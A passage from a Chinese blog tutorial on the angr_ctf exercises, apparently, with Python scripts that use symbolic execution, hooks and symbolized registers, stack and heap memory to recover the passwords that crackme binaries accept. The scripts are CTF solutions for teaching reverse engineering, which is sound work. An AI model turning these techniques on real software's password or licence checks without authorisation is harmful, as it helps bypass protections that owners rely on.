class="line">    simulation = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=find, avoid=avoid)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        solution0 = solution_state.se.eval(solution_state.globals[<span class="string">'solution0'</span>])</span><br><span class="line">        solution1 = solution_state.se.eval(solution_state.globals[<span class="string">'solution1'</span>])</span><br><span class="line">        print(solution0,solution1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">  filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">  main(filepath)</span><br></pre></td></tr></table></figure><p>需要将符号数据存入buffer0和buffer1中，同时由于变量在对象内声明并且最后需要在对象外使用，因此通过state类的globals实现存取</p><h3><span id="pveritesting-mo-shi">Veritesting模式</span><a href="#pveritesting-mo-shi" class="header-anchor">#</a></h3><ul><li><code>12_angr_veritesting</code></li></ul><p><code>veritesting</code>是一个符号执行的选项，使用路径融合来解决路径爆炸的问题，例如前面一个字符一个字符比较的情况</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state,veritesting=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find,avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv)!=<span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pzai-jing-tai-bian-yi-de-er-jin-zhi-zhong-jin-xing-hook">在静态编译的二进制中进行Hook</span><a href="#pzai-jing-tai-bian-yi-de-er-jin-zhi-zhong-jin-xing-hook" class="header-anchor">#</a></h3><ul><li><code>13_angr_static_binary</code></li></ul><p>在符号执行时，遇到一些libc中的函数，angr其实都会帮我们hook掉，不然会影响符号执行的速度。所以这里通过实例让我们自己试试使用angr的功能Hook一下，angr已经实现的hook如下：</p><p><a href="https://github.com/angr/angr/tree/master/angr/procedures/libc" target="_blank" rel="noopener">https://github.com/angr/angr/tree/master/angr/procedures/libc</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state,veritesting=<span class="literal">True</span>)</span><br><span class="line">    project.hook(<span class="number">0x804EF40</span>,angr.SIM_PROCEDURES[<span class="string">'libc'</span>][<span class="string">'printf'</span>]())</span><br><span class="line">    project.hook(<span class="number">0x804EF80</span>,angr.SIM_PROCEDURES[<span class="string">'libc'</span>][<span class="string">'scanf'</span>]())</span><br><span class="line">    project.hook(<span class="number">0x804F550</span>,angr.SIM_PROCEDURES[<span class="string">'libc'</span>][<span class="string">'puts'</span>]())</span><br><span class="line">    project.hook(<span class="number">0x80491F0</span>,angr.SIM_PROCEDURES[<span class="string">'glibc'</span>][<span class="string">'__libc_start_main'</span>]())</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find,avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv)!=<span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="phook-zi-ding-yi-de-dong-tai-lian-jie-ku">Hook自定义的动态链接库</span><a href="#phook-zi-ding-yi-de-dong-tai-lian-jie-ku" class="header-anchor">#</a></h3><ul><li><code>14_angr_shared_library</code></li></ul><p>这里需要我们Hook自定义的动态链接库中的函数，这里不需要我们去执行这个二进制文件，而是直接通过angr对动态库<code>lib14_angr_shared_library.so</code>中的<code>validate</code>函数进行符号执行。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    base = <span class="number">0x400000</span></span><br><span class="line">    validate_addr_offset = <span class="number">0x6D7</span></span><br><span class="line">    project = angr.Project(filepath, load_options=&#123;</span><br><span class="line">        <span class="string">'main_opts'</span>: &#123;</span><br><span class="line">            <span class="string">'custom_base_addr'</span>: base</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    password_addr = claripy.BVV(<span class="number">0xffffff00</span>, <span class="number">32</span>)  <span class="comment"># pointer</span></span><br><span class="line">    validate_addr = base + validate_addr_offset</span><br><span class="line"></span><br><span class="line">    init_state = project.factory.call_state(</span><br><span class="line">        validate_addr, password_addr, claripy.BVV(<span class="number">8</span>, <span class="number">32</span>))</span><br><span class="line">    password = claripy.BVS(<span class="string">"password"</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">    init_state.memory.store(password_addr, password)</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line">    success_addr = base+<span class="number">0x783</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=success_addr)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        solution_state.add_constraints(solution_state.regs.eax != <span class="number">0</span>) </span><br><span class="line">        solution = solution_state.se.eval(password,cast_to = bytes) </span><br><span class="line">        print(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><p>之前的hook我们都知道函数的地址，而在动态库中，我们没法直接知道地址，所以需要制定base，并传入参数调用函数。由于只对这个函数进行符号执行，所以也要加入符号执行正确时的约束。</p>]]></content>
      <categories>
        <category>CTF</category>
        <category>re</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>跟着AngrCTF学Angr(1)</title>
    <url>/c5d1d51e.html</url>
    <content><![CDATA[<blockquote><p>最近想跟着angr_ctf学习了一下符号执行（用来在做逆向的时候偷懒），还是挺有收获的</p></blockquote><p><strong>PS</strong>:</p><p><code>angr == 8.20.1.7</code></p><p>二进制文件和脚本存储于<code>https://github.com/ycdxsb/Challenges/tree/master/angr_ctf</code></p><a id="more"></a><h2><span id="pji-ben-shi-yong">基本使用</span><a href="#pji-ben-shi-yong" class="header-anchor">#</a></h2><h3><span id="pchang-gui-shi-yong">常规使用</span><a href="#pchang-gui-shi-yong" class="header-anchor">#</a></h3><ul><li><code>00_angr_find</code></li><li><code>01_angr_avoid</code></li></ul><p>简单设置目标地址和不想达到的地址即可，可以是单个地址也可以是很多地址，所以这里都用列表统一了一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line">    find = [<span class="number">0x8048678</span>]</span><br><span class="line">    avoid = []</span><br><span class="line">    sim.explore(find=find,avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv)!=<span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pshe-zhi-pan-duan-han-shu">设置判断函数</span><a href="#pshe-zhi-pan-duan-han-shu" class="header-anchor">#</a></h3><ul><li><code>02_angr_find_condition</code></li></ul><p>对于一些情况，我们不需要去仔细分析要避免或者搜索哪些分支，只知道正确会输出什么，错误会输出什么，这个时候可以使用判断函数代替之前的地址列表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find,avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv)!=<span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h2><span id="pfu-hao-hua-du-ru">符号化读入</span><a href="#pfu-hao-hua-du-ru" class="header-anchor">#</a></h2><p>由于angr不能处理复杂的scanf读入情况，因此要自己越过scanf对scanf后的状态赋值，并从scanf后开始执行</p><h3><span id="pfu-hao-hua-ji-cun-qi">符号化寄存器</span><a href="#pfu-hao-hua-ji-cun-qi" class="header-anchor">#</a></h3><ul><li><code>03_angr_symbolic_registers</code></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048882                 call    _printf</span><br><span class="line">.text:08048887                 add     esp, 10h</span><br><span class="line">.text:0804888A                 call    get_user_input</span><br><span class="line">.text:0804888F                 mov     [ebp+var_14], eax</span><br><span class="line">.text:08048892                 mov     [ebp+var_10], ebx</span><br><span class="line">.text:08048895                 mov     [ebp+var_C], edx</span><br><span class="line">.text:08048898                 sub     esp, 0Ch</span><br></pre></td></tr></table></figure><p>可以看到在get_user_input函数执行后，读入的三个数字分别存在eax,ebx和edx中，因此我们越过get_user_input函数开始执行，并且将其中的eax,ebx,edx赋值成angr中的符号即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    start_address = <span class="number">0x804888F</span></span><br><span class="line">    </span><br><span class="line">    init_state = project.factory.blank_state(addr = start_address)</span><br><span class="line">    password_bits = <span class="number">32</span></span><br><span class="line">    password0 = claripy.BVS(<span class="string">'password0'</span>, password_bits)</span><br><span class="line">    password1 = claripy.BVS(<span class="string">'password1'</span>, password_bits)</span><br><span class="line">    password2 = claripy.BVS(<span class="string">'password2'</span>, password_bits)</span><br><span class="line">    init_state.regs.eax = password0</span><br><span class="line">    init_state.regs.ebx = password1</span><br><span class="line">    init_state.regs.edx = password2</span><br><span class="line"></span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find,avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        solution0 = format(solution_state.se.eval(password0),<span class="string">'x'</span>)</span><br><span class="line">        solution1 = format(solution_state.se.eval(password1),<span class="string">'x'</span>)</span><br><span class="line">        solution2 = format(solution_state.se.eval(password2),<span class="string">'x'</span>)</span><br><span class="line">        print(solution0,solution1,solution2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv)!=<span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pfu-hao-hua-zhan">符号化栈</span><a href="#pfu-hao-hua-zhan" class="header-anchor">#</a></h3><ul><li><code>04_angr_symbolic_stack</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">handle_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __isoc99_scanf(<span class="string">"%u %u"</span>, &amp;v2, &amp;v1);</span><br><span class="line">  v2 = complex_function0(v2);</span><br><span class="line">  v1 = complex_function1(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">887024739</span> &amp;&amp; v1 == <span class="number">1261126168</span> )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Good Job."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Try again."</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，以<code>%u</code>格式读入后的数据v1和v2存储在栈上，那么当我们越过scanf开始执行时，不仅要构造符号向量，也要模拟函数执行前的栈。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    start_address = <span class="number">0x8048697</span></span><br><span class="line"></span><br><span class="line">    init_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">    init_state.regs.ebp = init_state.regs.esp</span><br><span class="line"></span><br><span class="line">    init_state.regs.esp -= <span class="number">8</span></span><br><span class="line">    password0 = claripy.BVS(<span class="string">'password0'</span>, <span class="number">32</span>)</span><br><span class="line">    password1 = claripy.BVS(<span class="string">'password1'</span>, <span class="number">32</span>)</span><br><span class="line">    init_state.stack_push(password0)</span><br><span class="line">    init_state.stack_push(password1)</span><br><span class="line"></span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find, avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        solution0 = solution_state.se.eval(password0)</span><br><span class="line">        solution1 = solution_state.se.eval(password1)</span><br><span class="line">        print(solution0, solution1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pfu-hao-hua-bss">符号化bss</span><a href="#pfu-hao-hua-bss" class="header-anchor">#</a></h3><ul><li><code>05_angr_symbolic_memory</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(user_input, <span class="number">0</span>, <span class="number">0x21</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%8s %8s %8s %8s"</span>, user_input, &amp;unk_B368DA8, &amp;unk_B368DB0, &amp;unk_B368DB8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0xB368DA0</span>) = complex_function(*(<span class="keyword">char</span> *)(i + <span class="number">0xB368DA0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(user_input, <span class="string">"IIZAUPRCZIZQJGKOJGDEAPHFFOBMNITD"</span>, <span class="number">0x20</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Good Job."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是以字符串形式读入四个8字节的字符串，然后存到bss段上，所以越过scanf，并且在bss段上赋上符号数据即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    start_address = <span class="number">0x8048601</span></span><br><span class="line"></span><br><span class="line">    init_state = project.factory.blank_state(addr=start_address)</span><br><span class="line">    passwords = [claripy.BVS(<span class="string">"password%d"</span> % i, <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">    passwords_address = [<span class="number">0xB368DA0</span>, <span class="number">0xB368DA8</span>, <span class="number">0xB368DB0</span>, <span class="number">0xB368DB8</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        init_state.memory.store(passwords_address[i], passwords[i])</span><br><span class="line"></span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=find, avoid=avoid)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line">        solutions = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            solutions.append(solution_state.se.eval(</span><br><span class="line">                passwords[i], cast_to = bytes))</span><br><span class="line">        print(<span class="string">b" "</span>.join(solutions))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pfu-hao-hua-dui">符号化堆</span><a href="#pfu-hao-hua-dui" class="header-anchor">#</a></h3><ul><li><code>06_angr_symbolic_dynamic_memory</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  buffer0 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  buffer1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer0, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer1, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%8s %8s"</span>, buffer0, buffer1, v6);</span><br></pre></td></tr></table></figure><p>在这里，<code>buffer0</code>和<code>buffer1</code>是<code>.bss</code>段的指针，在运行过程中申请了内存块，<code>scanf</code>读入的数据也是存在申请的内存块内的，所以需要自己符号化<code>malloc</code>的内存</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span 